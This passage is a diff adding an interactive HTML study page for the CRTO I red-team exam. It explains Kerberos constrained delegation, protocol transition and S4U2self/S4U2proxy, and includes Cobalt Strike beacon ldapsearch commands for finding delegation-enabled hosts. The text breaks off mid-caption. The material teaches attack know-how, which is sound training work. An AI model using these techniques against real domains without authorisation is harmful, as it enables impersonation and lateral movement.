@@ -1,0 +1,1245 @@
+<!doctype html>
+<html lang="en" data-theme="auto">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CRTO I — Constrained Delegation</title>
+<style>
+/* ── Tokens: the pack's system, plus semantic states ──────────────────────── */
+:root{
+  --bg:#0f1115; --bg2:#161a21; --fg:#e6e9ef; --muted:#9aa4b2; --line:#2a3140;
+  --accent:#ff6b35; --accent2:#4ea1ff; --code-bg:#11151c; --mark:#ffd166;
+  --ok:#4ade80; --ok-bg:rgba(74,222,128,.12);
+  --bad:#ff6b6b; --bad-bg:rgba(255,107,107,.12);
+  --warn:#ffd166; --warn-bg:rgba(255,209,102,.12);
+  --shadow:0 8px 30px rgba(0,0,0,.35);
+}
+@media (prefers-color-scheme: light){
+  :root[data-theme="auto"]{
+    --bg:#fbfbfd; --bg2:#ffffff; --fg:#171a1f; --muted:#5b6472; --line:#e3e6ec;
+    --accent:#d9480f; --accent2:#1c6dd0; --code-bg:#f4f5f8; --mark:#ffe08a;
+    --ok:#0f7a44; --ok-bg:#e7f7ee;
+    --bad:#c92a2a; --bad-bg:#fdeaea;
+    --warn:#8a5a00; --warn-bg:#fff5d6;
+    --shadow:0 8px 30px rgba(0,0,0,.10);
+  }
+}
+:root[data-theme="light"]{
+  --bg:#fbfbfd; --bg2:#ffffff; --fg:#171a1f; --muted:#5b6472; --line:#e3e6ec;
+  --accent:#d9480f; --accent2:#1c6dd0; --code-bg:#f4f5f8; --mark:#ffe08a;
+  --ok:#0f7a44; --ok-bg:#e7f7ee;
+  --bad:#c92a2a; --bad-bg:#fdeaea;
+  --warn:#8a5a00; --warn-bg:#fff5d6;
+  --shadow:0 8px 30px rgba(0,0,0,.10);
+}
+:root[data-theme="dark"]{
+  --bg:#0f1115; --bg2:#161a21; --fg:#e6e9ef; --muted:#9aa4b2; --line:#2a3140;
+  --accent:#ff6b35; --accent2:#4ea1ff; --code-bg:#11151c; --mark:#ffd166;
+  --ok:#4ade80; --ok-bg:rgba(74,222,128,.12);
+  --bad:#ff6b6b; --bad-bg:rgba(255,107,107,.12);
+  --warn:#ffd166; --warn-bg:rgba(255,209,102,.12);
+  --shadow:0 8px 30px rgba(0,0,0,.35);
+}
+
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0; background:var(--bg); color:var(--fg);
+  font:15px/1.65 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  padding-left:max(16px,env(safe-area-inset-left,0px));
+  padding-right:max(16px,env(safe-area-inset-right,0px));
+}
+.wrap{max-width:1040px;margin:0 auto;padding-block:28px 80px}
+a{color:var(--accent2);text-decoration:none}
+a:hover{text-decoration:underline}
+code,kbd,pre,.mono{font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace}
+code{font-size:.88em;background:var(--code-bg);border:1px solid var(--line);padding:1px 5px;border-radius:4px}
+pre{background:var(--code-bg);border:1px solid var(--line);border-radius:10px;padding:13px 15px;overflow:auto;margin:12px 0;line-height:1.5;box-shadow:none}
+pre code{background:none;border:0;padding:0;font-size:12.6px;white-space:pre;display:block}
+mark{background:var(--mark);color:#111;border-radius:2px;padding:0 2px}
+
+/* ── Masthead ─────────────────────────────────────────────────────────────── */
+.top{display:flex;justify-content:space-between;align-items:flex-start;gap:16px;flex-wrap:wrap}
+.eyebrow{font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);font-weight:700;margin:0 0 6px}
+h1{font-size:clamp(25px,4.2vw,33px);line-height:1.15;margin:0 0 8px;letter-spacing:-.015em;text-wrap:balance}
+.sub{color:var(--muted);margin:0;max-width:64ch}
+.sub b{color:var(--fg)}
+.tbtn{cursor:pointer;background:var(--bg2);color:var(--fg);border:1px solid var(--line);border-radius:8px;padding:7px 11px;font-size:12px;white-space:nowrap;font-family:inherit}
+.tbtn:hover{border-color:var(--accent2)}
+.toc{display:flex;gap:6px;flex-wrap:wrap;margin:22px 0 0;padding:0;list-style:none}
+.toc a{font-size:12px;border:1px solid var(--line);background:var(--bg2);border-radius:999px;padding:4px 10px;color:var(--muted)}
+.toc a:hover{border-color:var(--accent2);color:var(--fg);text-decoration:none}
+
+/* ── Sections ─────────────────────────────────────────────────────────────── */
+section{margin-top:46px;scroll-margin-top:16px}
+h2{font-size:clamp(19px,3vw,22px);margin:0 0 6px;letter-spacing:-.01em;text-wrap:balance}
+h2 .num{font-size:11.5px;font-weight:700;color:var(--accent);letter-spacing:.12em;margin-right:8px;vertical-align:2px}
+.lede{margin:0 0 16px;color:var(--muted);max-width:70ch}
+h3{font-size:15.5px;margin:24px 0 6px;color:var(--accent2)}
+p{margin:10px 0;max-width:74ch}
+ul,ol{margin:10px 0 10px 22px;padding:0;max-width:74ch}
+li{margin:5px 0}
+strong{font-weight:650;color:var(--fg)}
+
+/* ── Boxes ────────────────────────────────────────────────────────────────── */
+.card{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0;min-width:0}
+.card h3{margin-top:0}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;align-items:start}
+.grid2>*{min-width:0;margin:0}
+@media (max-width:780px){.grid2{grid-template-columns:1fr}}
+.note{border-left:3px solid var(--accent2);background:var(--bg2);padding:11px 15px;border-radius:0 8px 8px 0;margin:16px 0}
+.note p:first-child{margin-top:0}.note p:last-child{margin-bottom:0}
+.note .lbl{display:block;font-size:10.5px;text-transform:uppercase;letter-spacing:.12em;color:var(--accent2);font-weight:700;margin-bottom:2px}
+.note.warn{border-left-color:var(--warn);background:var(--warn-bg)}
+.note.warn .lbl{color:var(--warn)}
+
+/* ── Ticket rendering ─────────────────────────────────────────────────────── */
+.ticket{background:var(--code-bg);border:1px solid var(--line);border-radius:10px;padding:12px 14px;font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12.5px;line-height:1.85}
+.ticket .hd{font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin-bottom:6px;font-family:ui-sans-serif,system-ui,sans-serif}
+.ticket .row{display:grid;grid-template-columns:132px minmax(0,1fr);gap:10px}
+.ticket .k{color:var(--muted)}
+.ticket .v{overflow-wrap:anywhere}
+.ticket .v.hi{color:var(--accent);font-weight:600}
+.flag{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:0 7px;margin:0 4px 2px 0;font-size:11px;background:var(--bg2);font-family:ui-sans-serif,system-ui,sans-serif}
+.flag.on{border-color:var(--ok);color:var(--ok);background:var(--ok-bg)}
+.flag.off{border-color:var(--bad);color:var(--bad);background:var(--bad-bg);text-decoration:line-through}
+
+/* ── Chips ────────────────────────────────────────────────────────────────── */
+.chips{display:flex;flex-wrap:wrap;gap:7px;margin:10px 0}
+.chip{display:inline-flex;align-items:center;gap:6px;border:1px solid var(--line);border-radius:999px;padding:3px 10px;font-size:12px;background:var(--bg2);white-space:nowrap}
+.chip.ok{border-color:var(--ok);color:var(--ok);background:var(--ok-bg)}
+.chip.bad{border-color:var(--bad);color:var(--bad);background:var(--bad-bg)}
+.chip.mut{color:var(--muted)}
+
+/* ── Simulator ────────────────────────────────────────────────────────────── */
+.sim{display:grid;grid-template-columns:296px minmax(0,1fr);gap:18px;align-items:start;margin-top:18px}
+@media (max-width:880px){.sim{grid-template-columns:1fr}}
+.panel{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:14px;min-width:0}
+.panel>h3{margin:0 0 11px;font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted)}
+.field{display:flex;flex-direction:column;gap:5px;margin-bottom:15px;min-width:0}
+.field>label{font-size:12.5px;color:var(--muted);font-weight:500}
+select{width:100%;background:var(--bg);color:var(--fg);border:1px solid var(--line);border-radius:8px;padding:8px 9px;font-size:13px;font-family:inherit}
+select:focus-visible,button:focus-visible,input:focus-visible,summary:focus-visible{outline:2px solid var(--accent2);outline-offset:2px}
+.switch{display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none}
+.switch input{position:absolute;opacity:0;width:0;height:0}
+.switch .track{width:40px;height:22px;border-radius:999px;background:var(--line);position:relative;transition:background .15s;flex:none}
+.switch .track::after{content:"";position:absolute;top:3px;left:3px;width:16px;height:16px;border-radius:50%;background:var(--fg);transition:transform .15s}
+.switch input:checked+.track{background:var(--accent)}
+.switch input:checked+.track::after{transform:translateX(18px)}
+.switch input:focus-visible+.track{outline:2px solid var(--accent2);outline-offset:2px}
+.switch .txt{font-size:13px;line-height:1.35}
+.switch .txt small{display:block;color:var(--muted);font-size:11.5px;margin-top:1px}
+.scen{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px}
+.scen button{cursor:pointer;background:var(--bg);border:1px solid var(--line);color:var(--fg);border-radius:999px;padding:5px 10px;font-size:12px;font-family:inherit}
+.scen button:hover{border-color:var(--accent2)}
+.scen button[aria-pressed="true"]{border-color:var(--accent);color:var(--accent)}
+details{background:var(--bg);border:1px solid var(--line);border-radius:10px;padding:10px 12px;margin-bottom:12px}
+summary{cursor:pointer;font-size:12.5px;color:var(--muted);font-weight:600}
+details[open] summary{margin-bottom:10px}
+.steps{display:flex;flex-direction:column;gap:10px;margin-bottom:14px}
+.step{background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:12px 14px;display:grid;grid-template-columns:22px minmax(0,1fr) auto;gap:12px;align-items:start}
+.step .no{font:700 12px/24px ui-monospace,monospace;color:var(--accent)}
+.step .body{min-width:0}
+.step .t{font-weight:650;font-size:14px}
+.step .d{font-size:12.5px;color:var(--muted);margin-top:2px}
+.step .d code{font-size:11.5px}
+.step.done{border-left:3px solid var(--ok)}
+.step.fail{border-left:3px solid var(--bad)}
+.step .run{cursor:pointer;background:var(--accent);color:#fff;border:0;border-radius:8px;padding:7px 13px;font-size:12.5px;font-weight:650;white-space:nowrap;font-family:inherit;align-self:start}
+.step .run:disabled{background:var(--line);color:var(--muted);cursor:not-allowed}
+.step .run:hover:not(:disabled){filter:brightness(1.1)}
+@media (min-width:881px){.sim>.panel{position:sticky;top:16px}}
+@media (max-width:640px){
+  .step{grid-template-columns:20px minmax(0,1fr)}
+  .step>.run,.step>.chips{grid-column:2;justify-self:start;margin-top:2px}
+}
+.chip:disabled{opacity:.6;border-style:dashed;cursor:not-allowed}
+.verdict{border-radius:10px;padding:12px 14px;margin:12px 0;border:1px solid var(--line);background:var(--bg2)}
+.verdict.ok{border-color:var(--ok);background:var(--ok-bg)}
+.verdict.bad{border-color:var(--bad);background:var(--bad-bg)}
+.verdict .h{font-weight:700;font-size:13.5px;margin-bottom:2px}
+.verdict.ok .h{color:var(--ok)}.verdict.bad .h{color:var(--bad)}
+.checks{display:flex;flex-direction:column;gap:5px;margin-top:8px}
+.check{display:grid;grid-template-columns:16px minmax(0,1fr);gap:8px;font-size:12.8px;align-items:start}
+.check .m{font-weight:700;line-height:1.4}
+.check.ok .m{color:var(--ok)}.check.bad .m{color:var(--bad)}
+.check .why{display:block;color:var(--muted);font-size:11.8px}
+.log{background:#0b0e13;border:1px solid var(--line);border-radius:10px;padding:10px 12px;height:250px;overflow:auto;font:12.2px/1.62 ui-monospace,SFMono-Regular,Consolas,monospace;color:#cfd6e3}
+.log .l{white-space:pre-wrap;overflow-wrap:anywhere}
+.log .l.info{color:#8fb3e0}
+.log .l.ok{color:#6ee7a0}
+.log .l.err{color:#ff8a8a}
+.log .l.sys{color:#8b96a8}
+.log .l.head{color:#ffd166}
+.log .l.plain{color:#cfd6e3}
+.tray{display:grid;gap:10px;margin-top:10px}
+.empty{color:var(--muted);font-size:12.5px;border:1px dashed var(--line);border-radius:10px;padding:14px;text-align:center}
+
+/* ── Tables, quiz, calculator ─────────────────────────────────────────────── */
+.tbl-wrap{overflow-x:auto;margin:12px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid var(--line);padding:7px 10px;text-align:left;vertical-align:top}
+th{background:var(--bg2);font-weight:650;white-space:nowrap}
+td code{white-space:nowrap}
+.q{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:14px 16px;margin:12px 0}
+.q .qt{font-weight:600;margin:0 0 10px}
+.q .ansrow{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.q .ansrow button{cursor:pointer;border:1px solid var(--line);background:var(--bg);color:var(--fg);border-radius:8px;padding:7px 15px;font-size:13px;font-family:inherit}
+.q .ansrow button:hover{border-color:var(--accent2)}
+.q .ansrow button.correct{border-color:var(--ok);color:var(--ok);background:var(--ok-bg)}
+.q .ansrow button.wrong{border-color:var(--bad);color:var(--bad);background:var(--bad-bg)}
+.q .fb{display:none;margin-top:12px;font-size:13px;border-top:1px solid var(--line);padding-top:11px}
+.q .fb.show{display:block}
+.q .fb .tag{font-weight:700}
+.q .fb .tag.ok{color:var(--ok)}.q .fb .tag.bad{color:var(--bad)}
+.uac{display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end}
+.uac .field{margin:0;flex:1 1 180px}
+input[type=text]{background:var(--bg);color:var(--fg);border:1px solid var(--line);border-radius:8px;padding:8px 10px;font:13px ui-monospace,monospace;width:100%}
+.bits{display:grid;gap:0;margin-top:12px;font:12.5px ui-monospace,monospace;border-top:1px solid var(--line)}
+.bit{display:grid;grid-template-columns:96px 112px minmax(0,1fr);gap:10px;padding:4px 0;border-bottom:1px dashed var(--line);align-items:baseline}
+.bit .set{color:var(--ok);font-weight:700}
+.bit .unset{color:var(--muted)}
+.bit .nm{overflow-wrap:anywhere}
+.calc-out{margin-top:12px;font-size:13px}
+.calc-out code{font-size:12px}
+
+/* ── Diagrams ─────────────────────────────────────────────────────────────── */
+figure{margin:18px 0}
+figure svg{max-width:100%;height:auto;display:block;overflow:visible}
+figcaption{color:var(--muted);font-size:12.5px;margin-top:10px;max-width:74ch}
+svg text{font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif;fill:currentColor}
+svg .mut{fill:var(--muted)}
+svg .acc{fill:var(--accent2)}
+svg .bad{fill:var(--bad)}
+svg .okc{fill:var(--ok)}
+svg .box{fill:var(--bg2);stroke:var(--line)}
+svg .box.hl{stroke:var(--accent2);stroke-width:2}
+
+footer{margin-top:60px;border-top:1px solid var(--line);padding-top:16px;color:var(--muted);font-size:12.5px}
+footer p{max-width:74ch}
+.kbd-hint{font-size:12px;color:var(--muted)}
+@media (prefers-reduced-motion:reduce){*{scroll-behavior:auto!important;transition:none!important;animation:none!important}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="top">
+  <div>
+    <p class="eyebrow">CRTO I · Kerberos</p>
+    <h1>Constrained Delegation, end to end</h1>
+    <p class="sub">Two requests, three conditions, one flag. This page builds the model, then lets you
+      <b>run the attack yourself</b> and watch the KDC allow or deny it.</p>
+  </div>
+  <button class="tbtn" id="theme" type="button" aria-label="Switch theme">Theme: auto</button>
+</header>
+
+<nav aria-label="Sections">
+  <ul class="toc">
+    <li><a href="#idea">1 · The one idea</a></li>
+    <li><a href="#why">2 · Why delegation exists</a></li>
+    <li><a href="#attrs">3 · The two attributes</a></li>
+    <li><a href="#s4u">4 · S4U2self vs S4U2proxy</a></li>
+    <li><a href="#sim">5 · The simulator</a></li>
+    <li><a href="#cases">6 · The two attack cases</a></li>
+    <li><a href="#kdc">7 · You are the KDC</a></li>
+    <li><a href="#confusion">8 · Confusions</a></li>
+    <li><a href="#cheat">9 · Cheat sheet</a></li>
+  </ul>
+</nav>
+
+<!-- ══ 1 ═══════════════════════════════════════════════════════════════════ -->
+<section id="idea">
+  <h2><span class="num">01</span>The one idea</h2>
+  <p class="lede">Every Kerberos service ticket is a claim, and it claims exactly two things: <b>who you get
+    to be</b>, and <b>which service you get to be them to</b>. Nothing else. Get this and the rest follows.</p>
+
+  <div class="card">
+    <div class="ticket" id="tkA">
+      <div class="hd">A service ticket — the only two fields that matter</div>
+      <div class="row"><span class="k">ServiceName</span><span class="v hi">cifs/lon-fs-1</span></div>
+      <div class="row"><span class="k">UserName</span><span class="v hi">dyork</span></div>
+      <div class="row"><span class="k">ServiceRealm</span><span class="v">CONTOSO.COM</span></div>
+      <div class="row"><span class="k">Flags</span><span class="v">
+        <span class="flag">name_canonicalize</span><span class="flag">pre_authent</span><span class="flag">renewable</span><span class="flag on">forwardable</span>
+      </span></div>
+    </div>
+
+    <p style="margin-top:16px"><strong>Try to use it somewhere else.</strong> The ticket above is a pass
+      for <code>dyork</code> to the <code>cifs</code> service on <code>lon-fs-1</code>. Click a resource:</p>
+    <div class="chips" id="useBtns">
+      <button class="chip" type="button" data-needs="cifs/lon-fs-1">\\lon-fs-1\c$</button>
+      <button class="chip" type="button" data-needs="cifs/lon-dc-1">\\lon-dc-1\SYSVOL</button>
+      <button class="chip" type="button" data-needs="HTTP/lon-ws-2">http://lon-ws-2</button>
+      <button class="chip" type="button" data-needs="MSSQLSvc/cont-sql-1">cont-sql-1 MSSQL</button>
+    </div>
+    <div id="useOut" class="calc-out" aria-live="polite"></div>
+  </div>
+
+  <div class="note">
+    <span class="lbl">This is the whole game</span>
+    <p>To act as <code>dyork</code> against <code>lon-fs-1</code>, you need a ticket whose
+      <code>ServiceName</code> is <code>cifs/lon-fs-1</code> <em>and</em> whose <code>UserName</code> is
+      <code>dyork</code>. You cannot edit the one you hold. You have to get the <strong>KDC</strong> to print
+      you a new one — and the KDC is not going to do that for just anyone.</p>
+    <p>Constrained delegation is the machinery that makes the KDC print it. Everything on this page is about
+      the three things the KDC checks before it does.</p>
+  </div>
+</section>
+
+<!-- ══ 2 ═══════════════════════════════════════════════════════════════════ -->
+<section id="why">
+  <h2><span class="num">02</span>Why delegation exists at all</h2>
+  <p class="lede">A normal Kerberos login is one hop. Delegation is what happens when a service needs to
+    make a <em>second</em> hop as the user — and discovers it has nothing to make it with.</p>
+
+  <div class="card">
+    <figure>
+      <svg viewBox="0 0 860 300" role="img" aria-label="Client authenticates to LON-WS-1; LON-WS-1 then needs to reach CONT-SQL-1 as the same user, but cannot mint that ticket itself, so it must ask the KDC.">
+        <defs>
+          <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+            <polygon points="0,0 10,5 0,10" fill="currentColor"/>
+          </marker>
+          <marker id="arBad" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+            <polygon points="0,0 10,5 0,10" fill="#ff6b6b"/>
+          </marker>
+        </defs>
+
+        <rect class="box" x="16" y="26" width="150" height="66" rx="10"/>
+        <text x="91" y="52" text-anchor="middle" font-size="13" font-weight="600">ATTACKER</text>
+        <text class="mut" x="91" y="70" text-anchor="middle" font-size="11">holds dyork's creds</text>
+
+        <rect class="box hl" x="350" y="26" width="150" height="66" rx="10"/>
+        <text x="425" y="52" text-anchor="middle" font-size="13" font-weight="600">LON-WS-1</text>
+        <text class="mut" x="425" y="70" text-anchor="middle" font-size="11">HTTP/lon-ws-1</text>
+
+        <rect class="box" x="694" y="26" width="150" height="66" rx="10"/>
+        <text x="769" y="52" text-anchor="middle" font-size="13" font-weight="600">CONT-SQL-1</text>
+        <text class="mut" x="769" y="70" text-anchor="middle" font-size="11">MSSQLSvc/cont-sql-1</text>
+
+        <rect class="box" x="350" y="204" width="150" height="66" rx="10"/>
+        <text x="425" y="230" text-anchor="middle" font-size="13" font-weight="600">LON-DC-1</text>
+        <text class="mut" x="425" y="248" text-anchor="middle" font-size="11">the KDC</text>
+
+        <!-- hop 1 -->
+        <line x1="166" y1="59" x2="342" y2="59" stroke="currentColor" stroke-width="1.6" marker-end="url(#ar)"/>
+        <text x="254" y="49" text-anchor="middle" font-size="11">① TGS for dyork</text>
+
+        <!-- hop 2 (fails) -->
+        <line x1="500" y1="59" x2="686" y2="59" stroke="#ff6b6b" stroke-width="1.6" stroke-dasharray="5 4" marker-end="url(#arBad)"/>
+        <text class="bad" x="593" y="49" text-anchor="middle" font-size="11">② needs a ticket for dyork</text>
+        <text class="bad" x="593" y="76" text-anchor="middle" font-size="11" font-weight="700">✗ has none</text>
+
+        <!-- ask KDC -->
+        <line x1="412" y1="94" x2="412" y2="198" stroke="currentColor" stroke-width="1.6" marker-end="url(#ar)"/>
+        <text x="421" y="140" font-size="11">③ "print me one"</text>
+        <text class="mut" x="421" y="155" font-size="11">= delegation</text>
+      </svg>
+      <figcaption>Hop ① works because the attacker holds a ticket the KDC already issued. Hop ② is the
+        problem: LON-WS-1 holds no credential for dyork that CONT-SQL-1 will accept. Only the KDC can
+        mint hop ②, so LON-WS-1 has to ask — that ask is delegation, and the rules around it are
+        constrained delegation.</figcaption>
+    </figure>
+  </div>
+
+  <h3>Why can't the service just do it?</h3>
+  <p>Three obvious ideas, all of which fail. Click one:</p>
+  <div class="chips" id="whyBtns">
+    <button class="chip" type="button" data-why="local">Let the attacker just "run as" dyork</button>
+    <button class="chip" type="button" data-why="forge">Forge a ticket for cont-sql-1</button>
+    <button class="chip" type="button" data-why="tgt">Hand over dyork's TGT</button>
+  </div>
+  <div id="whyOut" class="calc-out" aria-live="polite"></div>
+
+  <div class="note">
+    <span class="lbl">The mental model</span>
+    <p>Delegation is not "the service steals the user's password". It is <strong>the KDC agreeing to issue a
+      second ticket on the service's word</strong>. So the question is never "how do I impersonate?" — it is
+      <strong>"what does the KDC require before it will print the ticket?"</strong>. Constrained delegation
+      answers that with three conditions, and the next sections walk them one at a time.</p>
+  </div>
+</section>
+
+<!-- ══ 3 ═══════════════════════════════════════════════════════════════════ -->
+<section id="attrs">
+  <h2><span class="num">03</span>The two attributes — two different jobs</h2>
+  <p class="lede">Constrained delegation is configured in two places, and people mix them up constantly.
+    One is a <b>list of destinations</b>. The other is a <b>permission to invent identities</b>.</p>
+
+  <div class="grid2">
+    <div class="card">
+      <h3 style="margin-top:0"><code>msDS-AllowedToDelegateTo</code></h3>
+      <p style="margin-top:0"><strong>Question it answers:</strong> which services may I ask for a ticket to?</p>
+      <p>On the <em>front-end</em> computer object. A list of target SPNs:</p>
+      <pre><code>cifs/lon-fs-1.contoso.com
+cifs/lon-fs-1</code></pre>
+      <p>If the SPN you request is not in this list, the KDC refuses. That is the
+        <em>constrained</em> in constrained delegation — it replaces unconstrained delegation's "any
+        service in the domain".</p>
+      <p class="kbd-hint">Note both spellings get listed. The FQDN form and the short form are separate
+        strings, so request the one that is actually present.</p>
+    </div>
+    <div class="card">
+      <h3 style="margin-top:0">UAC bit <code>0x1000000</code></h3>
+      <p style="margin-top:0"><strong>Question it answers:</strong> may I claim a user who never proved
+        themselves to me?</p>
+      <p>On the same object, in <code>userAccountControl</code>:</p>
+      <pre><code>TRUSTED_TO_AUTH_FOR_DELEGATION = 16777216
+                              = 0x1000000</code></pre>
+      <p>This is <strong>protocol transition</strong>. With it, the service may name <em>any</em> user in
+        an S4U2self request and the KDC will vouch for them. Without it, the KDC only vouches for users
+        it actually saw authenticate.</p>
+      <p class="kbd-hint">Default for a computer is <code>4096</code>. Anything else means extra bits are set.</p>
+    </div>
+  </div>
+
+  <h3>Find them with ldapsearch</h3>
+  <pre><code>beacon&gt; ldapsearch (&amp;(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
+
+sAMAccountName: LON-WS-1$
+msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
+
+beacon&gt; ldapsearch (&amp;(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
+
+userAccountControl: 16781312</code></pre>
+
+  <div class="card">
+    <h3 style="margin-top:0">Decode a <code>userAccountControl</code> value</h3>
+    <p style="margin-top:0">The exam teaches <code>[System.Convert]::ToBoolean($uac -band 16777216)</code>.
+      That is a bitwise AND, one flag at a time. Try it here — the value below is <code>16781312</code>,
+      which is <code>4096</code> plus <code>16777216</code>.</p>
+    <div class="uac">
+      <div class="field">
+        <label for="uacIn">userAccountControl (decimal or 0x…)</label>
+        <input type="text" id="uacIn" value="16781312" inputmode="numeric" autocomplete="off" spellcheck="false">
+      </div>
+      <button class="tbtn" type="button" data-uac="4096">4096</button>
+      <button class="tbtn" type="button" data-uac="16781312">16781312</button>
+      <button class="tbtn" type="button" data-uac="528384">528384</button>
+    </div>
+    <div class="bits" id="uacBits" aria-live="polite"></div>
+    <div class="calc-out" id="uacOut" aria-live="polite"></div>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">Read the flags, not the number</span>
+    <p><code>16781312</code> and <code>16781344</code> both look like "on" if you eyeball them. The first is
+      protocol transition; the second adds <code>PASSWD_NOTREQD</code> and changes nothing about delegation.
+      Mask the bit: <code>value -band 16777216</code>. If it is non-zero, PT is on.</p>
+  </div>
+</section>
+
+<!-- ══ 4 ═══════════════════════════════════════════════════════════════════ -->
+<section id="s4u">
+  <h2><span class="num">04</span>S4U2self vs S4U2proxy — the two tickets</h2>
+  <p class="lede">This is the part that does not click, usually because both are described as "S4U" and both
+    return "a ticket". They return <b>different tickets for different purposes</b>. Separate them in your
+    head and the attack falls out.</p>
+
+  <div class="grid2">
+    <div class="card">
+      <h3 style="margin-top:0">S4U2self — "a ticket to myself"</h3>
+      <p style="margin-top:0"><code>Service for User to Self</code>. The service asks the KDC:</p>
+      <blockquote style="margin:8px 0;padding-left:12px;border-left:2px solid var(--line);color:var(--muted)">
+        "Give me a service ticket for <code>dyork</code> to <strong>me</strong>."</blockquote>
+      <p>You get a ticket with <code>ServiceName = LON-WS-1$</code> (the service's own name) and
+        <code>UserName = dyork</code>.</p>
+      <p><strong>Why it exists:</strong> if the user logged in over NTLM, the service never saw a Kerberos
+        ticket to prove who they were. S4U2self manufactures that proof anyway.</p>
+      <p><strong>What decides its quality:</strong> the KDC sets <code>forwardable</code> on it
+        <em>only if</em> protocol transition is on. That single flag is the hinge for everything later.</p>
+    </div>
+    <div class="card">
+      <h3 style="margin-top:0">S4U2proxy — "a ticket to the next hop"</h3>
+      <p style="margin-top:0"><code>Service for User to Proxy</code>. The service shows the KDC a ticket for
+        the user and asks:</p>
+      <blockquote style="margin:8px 0;padding-left:12px;border-left:2px solid var(--line);color:var(--muted)">
+        "Turn this into a ticket for <code>dyork</code> to <strong><code>cifs/lon-fs-1</code></strong>."</blockquote>
+      <p>You get a ticket with <code>ServiceName = cifs/lon-fs-1</code> and
+        <code>UserName = dyork</code>. <strong>This is the usable one.</strong></p>
+      <p><strong>What it needs:</strong> an <em>evidence</em> ticket for the user, addressed to the
+        requesting service, carrying the <code>forwardable</code> flag — plus the target SPN on the
+        whitelist.</p>
+      <p><strong>The name:</strong> "proxy" because the service acts <em>on behalf of</em> the user, not as
+        them.</p>
+    </div>
+  </div>
+
+  <h3>The exchange</h3>
+  <figure>
+    <svg viewBox="0 0 820 380" role="img" aria-label="Sequence: LON-WS-1 asks the KDC for an S4U2self ticket for dyork to itself; then presents that ticket in an S4U2proxy request for cifs/lon-fs-1; the KDC checks forwardable and the allowed-to-delegate list before issuing the final ticket.">
+      <defs>
+        <marker id="ar2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+          <polygon points="0,0 10,5 0,10" fill="currentColor"/>
+        </marker>
+      </defs>
+
+      <rect class="box hl" x="40" y="8" width="160" height="50" rx="9"/>
+      <text x="120" y="30" text-anchor="middle" font-size="12.5" font-weight="600">LON-WS-1$</text>
+      <text class="mut" x="120" y="46" text-anchor="middle" font-size="10.5">compromised service</text>
+
+      <rect class="box" x="390" y="8" width="160" height="50" rx="9"/>
+      <text x="470" y="30" text-anchor="middle" font-size="12.5" font-weight="600">LON-DC-1</text>
+      <text class="mut" x="470" y="46" text-anchor="middle" font-size="10.5">the KDC</text>
+
+      <line x1="120" y1="58" x2="120" y2="368" stroke="currentColor" stroke-width="1" stroke-dasharray="3 4" opacity=".45"/>
+      <line x1="470" y1="58" x2="470" y2="368" stroke="currentColor" stroke-width="1" stroke-dasharray="3 4" opacity=".45"/>
+
+      <line x1="126" y1="100" x2="462" y2="100" stroke="currentColor" stroke-width="1.6" marker-end="url(#ar2)"/>
+      <text x="294" y="90" text-anchor="middle" font-size="11">① S4U2self — a ticket to me, for dyork</text>
+
+      <line x1="464" y1="146" x2="128" y2="146" stroke="currentColor" stroke-width="1.6" marker-end="url(#ar2)"/>
+      <text x="294" y="136" text-anchor="middle" font-size="11">② TGS: <tspan class="acc">dyork → LON-WS-1$</tspan></text>
+      <text class="mut" x="294" y="161" text-anchor="middle" font-size="10.5">forwardable only if protocol transition is on</text>
+
+      <line x1="126" y1="238" x2="462" y2="238" stroke="currentColor" stroke-width="1.6" marker-end="url(#ar2)"/>
+      <text x="294" y="228" text-anchor="middle" font-size="11">③ S4U2proxy — "here is ②, now give me cifs/lon-fs-1"</text>
+
+      <line x1="464" y1="322" x2="128" y2="322" stroke="currentColor" stroke-width="1.6" marker-end="url(#ar2)"/>
+      <text x="294" y="312" text-anchor="middle" font-size="11">④ TGS: <tspan class="okc">dyork → cifs/lon-fs-1</tspan></text>
+
+      <rect x="512" y="182" width="296" height="112" rx="9" fill="none" stroke="var(--line)" stroke-dasharray="4 4"/>
+      <text class="mut" x="526" y="202" font-size="10.5" letter-spacing="1">KDC CHECKS ON ③</text>
+      <text x="526" y="224" font-size="11"><tspan class="okc">✓</tspan> is ② forwardable?</text>
+      <text x="526" y="246" font-size="11"><tspan class="okc">✓</tspan> is ② addressed to the requester?</text>
+      <text x="526" y="268" font-size="11"><tspan class="okc">✓</tspan> is cifs/lon-fs-1 on the list?</text>
+    </svg>
+    <figcaption>Two round trips, not one. ① manufactures evidence; ③ spends it. If ③ fails with
+      <code>KDC_ERR_BADOPTION</code>, the fault is almost always in ② — an evidence ticket without the
